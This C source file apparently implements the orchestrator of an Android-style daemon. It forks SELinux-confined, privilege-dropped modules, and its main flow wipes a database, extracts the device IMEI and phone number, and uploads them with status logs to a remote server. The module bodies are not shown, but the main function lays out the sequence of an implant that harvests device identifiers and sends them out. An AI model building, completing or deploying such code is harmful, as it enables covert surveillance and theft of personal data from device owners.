#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <signal.h>
#include <errno.h>
#include <poll.h>

#include "common.h"
#include "ipc.h"
#include "symbol_resolver.h"
#include "modules.h"

static ProjectStatus wait_for_process_exit(pid_t pid)
{
    int elapsed_ms = 0;
    int status;

    /* Phase 1: Natural Exit */
    while (elapsed_ms < TIMEOUT_EXIT_MS) {
        pid_t result = waitpid(pid, &status, WNOHANG);
        if (result == -1 && errno == EINTR) continue;
        if (result > 0) return STATUS_SUCCESS;
        usleep(POLL_INTERVAL_MS * 1000);
        elapsed_ms += POLL_INTERVAL_MS;
    }

    // Phase 2: Force Kill
    sal_log_error("PID %d timed out. Sending SIGKILL.", pid);
    kill(pid, SIGKILL);

    elapsed_ms = 0;
    while (elapsed_ms < TIMEOUT_EXIT_MS) {
        pid_t result = waitpid(pid, &status, WNOHANG);
        if (result == -1 && errno == EINTR) continue;
        if (result > 0) return STATUS_SUCCESS;
        usleep(POLL_INTERVAL_MS * 1000);
        elapsed_ms += POLL_INTERVAL_MS;
    }

    sal_log_error("CRITICAL: PID %d is a Zombie.", pid);
    return STATUS_ERR_ZOMBIE;
}

static pid_t spawn_module_process(const module_config_t* config, int* parent_fd, const char* arg)
{
    int sv[2] = { 0 };
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        return -1;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(sv[0]); close(sv[1]);
        return -1;
    }

    if (pid == 0) {
        // --- Child ---
        close(sv[0]);
        int child_fd = sv[1];

        // Die if daemon dies
        prctl(PR_SET_PDEATHSIG, SIGKILL);

        // Security Context
        sal_set_selinux_context(config->selinux_context);
        if (setresgid(config->gid, config->gid, config->gid) < 0) _exit(EXIT_FAILURE);
        if (setresuid(config->uid, config->uid, config->uid) < 0) _exit(EXIT_FAILURE);

        if (config->entry_point) config->entry_point(child_fd, arg);
        _exit(EXIT_SUCCESS);
    }

    // --- Parent ---
    close(sv[1]);
    *parent_fd = sv[0];
    return pid;
}

static ProjectStatus execute_stage(int mod_id, const char* arg, char* out_buf, size_t size)
{
    int fd = -1;
    pid_t pid = -1;
    const module_config_t* config = get_module_config(mod_id);
    if (config == NULL) {
        return STATUS_ERR_INVALID_ARG;
    }

    pid = spawn_module_process(config, &fd, arg);
    if (pid < 0) {
        return STATUS_ERR_FORK;
    }

    ProjectStatus stage_status = STATUS_ERR_GENERIC;
    struct pollfd pfd = { .fd = fd, .events = POLLIN };
    int poll_res;

    do {
        poll_res = poll(&pfd, 1, TIMEOUT_IPC_MS);
    } while (poll_res < 0 && errno == EINTR);

    if (poll_res > 0 && (pfd.revents & POLLIN)) {
        ipc_response_t resp;
        ipc_init_response(&resp);

        ProjectStatus ipc_res = ipc_receive_packet(fd, &resp);

        if (ipc_res == STATUS_SUCCESS && resp.status_code == 0) {
            if (out_buf && size > 0 && resp.data_len > 0) {
                strncpy(out_buf, resp.payload, size - 1);
                out_buf[size - 1] = '\0';
            }
            stage_status = STATUS_SUCCESS;
        } else {
            sal_log_error("Module %s IPC/Logic Error: %d", config->name, ipc_res);
            stage_status = (ipc_res != STATUS_SUCCESS) ? ipc_res : STATUS_ERR_MODULE_FAIL;
        }
    } else if (poll_res == 0) {
        sal_log_error("Module %s Timeout", config->name);
        stage_status = STATUS_ERR_TIMEOUT;
    } else {
        sal_log_error("Module %s Poll Error", config->name);
        stage_status = STATUS_ERR_POLL;
    }

    close(fd);
    ProjectStatus reap_status = wait_for_process_exit(pid);
    if (reap_status != STATUS_SUCCESS) return reap_status;

    return stage_status;
}

int main()
{
    DEBUG("Daemon started");
    char log_buf[512] = { 0 };
    daemon_context_t ctx = { 0 };
    char payload[IPC_PACKET_SIZE] = { 0 };

    /* Initialize all dynamic symbol resolving */
    if(sal_init() != STATUS_SUCCESS) {
        ERROR("Failed to initialize sal");
        return -1;
    }

    /* 
     * This is the main flow of the daemon. We'll call one module at a time, waiting for it's completion.
     * A module can complete in either: success, error, crash. We handle each event accordingly.
     * In case a critical module crashes, the daemon exists.
     */

    DEBUG("Sending log to server");
    snprintf(log_buf, sizeof(log_buf), "Starting daemon flow");
    if (execute_stage(MOD_ID_LOGGER, log_buf, NULL, 0) != STATUS_SUCCESS) {
        ERROR("Failed to send log to server. continue...");
    }

    DEBUG("Cleaning DB...");
    if (execute_stage(MOD_ID_DB_CLEANER, NULL, NULL, 0) == STATUS_SUCCESS) {
        ctx.db_cleaned = 1;
    } else {
        ERROR("Failed to clean DB. Continue...");
    }

    DEBUG("Extracting IMEI...");
    if (execute_stage(MOD_ID_IMEI, NULL, ctx.imei, sizeof(ctx.imei)) == STATUS_SUCCESS) {
        ctx.has_imei = 1;
    } else {
        ERROR("Failed to extract IMEI. Continue...");
    }

    DEBUG("Extracting Phone Number...");
    if (execute_stage(MOD_ID_PHONE, NULL, ctx.phone, sizeof(ctx.phone)) == STATUS_SUCCESS) {
        ctx.has_phone = 1;
    } else {
        ERROR("Failed to extract Phone Number. Continue...");
    }

    DEBUG("Sending log to server");
    snprintf(log_buf, sizeof(log_buf), "All modules completed");
    if (execute_stage(MOD_ID_LOGGER, log_buf, NULL, 0) != STATUS_SUCCESS) {
        ERROR("Failed to send log to server. continue...");
    }

    /* After performing everything we wanted, communicate with the server */
    DEBUG("Uploading artifacts to server...");
    snprintf(payload, sizeof(payload), "IMEI:%s|PHONE:%s|DB:%d",
        ctx.has_imei ? ctx.imei : "N/A",
        ctx.has_phone ? ctx.phone : "N/A",
        ctx.db_cleaned
    );
    if (execute_stage(MOD_ID_SENDER, payload, NULL, 0) != STATUS_SUCCESS) {
        ERROR("Failed to send artifacts to server");
    }

    /* Cleanup */
    sal_cleanup();
    return 0;
}